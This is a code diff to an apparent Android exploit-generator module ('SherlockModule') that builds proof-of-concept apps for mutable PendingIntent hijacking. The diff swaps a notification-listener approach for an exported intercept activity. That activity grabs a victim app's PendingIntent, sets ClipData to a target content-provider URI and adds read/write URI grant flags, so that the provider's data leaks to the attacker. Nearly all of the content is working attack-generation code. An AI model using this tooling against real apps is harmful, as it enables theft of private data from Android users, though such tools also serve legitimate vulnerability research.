@@ -16,20 +16,22 @@ class SherlockModule(App):
 
     def __init__(self):
         super().__init__()
-        self._id = "mutable_pending_intent_notification"
+        self._id = "mutable_pending_intent_basic_activity"
         self._template = Template()
 
 
     def register_options(self):
         option_state.add_options([
-            OptBool("IS_EXPORTED", [True, "Whether the target class is exported (Default: True)", False]),
+            OptBool("IS_EXPORTED", [True, "Whether the target class is exported (Default: False)", False]),
             OptBool("VIA_DEEPLINK", [False, "Communicate to target via deeplink (Default: False)", False]),
             OptStr("DEEPLINK_URI", [False, "Deeplink URI to launch target activity"]),
             OptStr("PROVIDER_URI", [True, "Content provider URI to access"]),
             OptStr("TARGET_PACKAGE", [True, "Target package name"]),
             OptStr("TARGET_CLASS", [False, "Target class name"]),
+            OptStr("PARCEL_EXTRA", [True, "Wrapper intent parcel extra key"]),
             OptStr("BUNDLE_EXTRA", [False, "Bundle extra key"]),
             OptStr("BUNDLE_PARCEL", [False, "Parcel bundle key"]),
+            OptStr("WRAPPER_ACTION", [True, "Wrapper intent action to intercept"]),
             OptStr("BASE_ACTION", [False, "Base intent action to intercept"]),
             OptInt("REQUEST_CODE", [True, "Pending intent request code"]),
             OptEnum("PROVIDER_TYPE", [True, "Content provider type (1: Share content, 2: Access to files)", 1, [1, 2]]),
@@ -62,25 +64,25 @@ class SherlockModule(App):
         provider_uri = opts['PROVIDER_URI']
         target_package = opts['TARGET_PACKAGE']
         target_class = opts['TARGET_CLASS']
+        parcel_extra = opts['PARCEL_EXTRA']
         bundle_extra = opts['BUNDLE_EXTRA']
         bundle_parcel = opts['BUNDLE_PARCEL']
+        wrapper_action = opts['WRAPPER_ACTION']
         base_action = opts['BASE_ACTION']
         request_code = opts['REQUEST_CODE']
         provider_type = opts['PROVIDER_TYPE']
         put_extra = opts['PUT_EXTRA']
 
         exploit_activity_name = self.activity_name(self._id, target_package)
+        intercept_activity_name = f'{self.activity_name(self._id, target_package)}Intercept'
         leak_provider_activity_name = f'{self.activity_name(self._id, target_package)}LeakProvider'
 
         manifest = [
             self._template.build_manifest_component(
-                "NotifListenerService",
-                type="service",
+                intercept_activity_name,
                 is_exported=True,
-                permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE",
                 intercept=True,
-                action="android.service.notification.NotificationListenerService",
-                category=[]
+                action=wrapper_action
             ),
             self._template.build_manifest_component(
                 leak_provider_activity_name,
@@ -89,48 +91,28 @@ class SherlockModule(App):
                 action="sherlock.poc.LEAK_PROVIDER" if base_action == "" else base_action
             ),
             self._template.build_manifest_component(
-                self.activity_name(self._id, "enable.notification.access")
-            ),
-            self._template.build_manifest_component(
                 exploit_activity_name
             )
         ]
 
-        notif_access_activity = self._template.build_activity(
-            name=self.activity_name(self._id, "enable.notification.access"),
-            libs=[
-                "android.content.Context",
-                "android.content.Intent",
-                "android.os.Bundle",
-                "androidx.appcompat.app.AppCompatActivity"
-            ],
-            bind_button=True,
-            on_create=[
-                self._template.build_intent(
-                    set_action="android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"
-                )
-            ]
-        )
-
-        notif_listener_service = self._template.build_notif_listener_service(
-            name="NotifListenerService",
+        hijack_activity = self._template.build_activity(
+            name=intercept_activity_name,
             libs=[
                 "android.app.PendingIntent",
                 "android.content.ClipData",
                 "android.content.Intent",
                 "android.net.Uri",
+                "android.os.Bundle",
                 "android.util.Log",
-                "android.service.notification.NotificationListenerService",
-                "android.service.notification.StatusBarNotification"
+                "androidx.appcompat.app.AppCompatActivity"
             ],
-            on_notif_posted=[
-                f'if (!sbn.getPackageName().equals("{target_package}")) {{ return; }}',
-                f'Bundle bundle = getIntent().getBundleExtra("{bundle_extra}");' if bundle_extra != "" else "",
+            on_create=[
+                f'Bundle bundle = getIntent().getBundleExtra("{bundle_extra}");' if bundle_extra != "" else "", 
                 f'PendingIntent pi = bundle.getParcelable("{bundle_parcel}");' if bundle_extra != "" else "",
-                "PendingIntent pi = sbn.getNotification().contentIntent;",
+                f'PendingIntent pi = getIntent().getParcelableExtra("{parcel_extra}");',
                 self._template.build_intent(
                     intent_var="hijack",
-                    set_action="sherlock.poc.LEAK_PROVIDER" if base_action == "" else base_action,
+                    set_action="sherlock.poc.LEAK_PROVIDER" if base_action == "" else None,
                     set_clipdata=provider_uri,
                     set_flags=["Intent.FLAG_GRANT_READ_URI_PERMISSION", "Intent.FLAG_GRANT_WRITE_URI_PERMISSION"],
                     start_activity=False
@@ -185,12 +167,8 @@ class SherlockModule(App):
 
         component = [
             {
-                "name": f"{self.activity_name(self._id, 'enable.notification.access')}.java",
-                "content": notif_access_activity 
-            },
-            {
-                "name": "NotifListenerService.java",
-                "content": notif_listener_service
+                "name": f"{intercept_activity_name}.java",
+                "content": hijack_activity 
             },
             {
                 "name": f"{leak_provider_activity_name}.java",
@@ -202,26 +180,14 @@ class SherlockModule(App):
             }
         ]
 
-        button_layout = [
-            self._template.button_layout(self._id, "enable.notification.access"),
-            self._template.button_layout(self._id, target_package)
-        ]
-
-        bind_button = [
-            self._template.bind_button(self._id, "enable.notification.access"),
-            self._template.bind_button(self._id, target_package)
-        ]
-
         if not is_exported:
             manifest.pop()
             component.pop()
-            button_layout.pop()
-            bind_button.pop()
 
         app = {
             "manifest": manifest,
-            "layout": button_layout,
-            "bind_button": bind_button,
+            "layout": self._template.button_layout(self._id, target_package) if is_exported else None,
+            "bind_button": self._template.bind_button(self._id, target_package) if is_exported else None,
             "component": component
         }
 
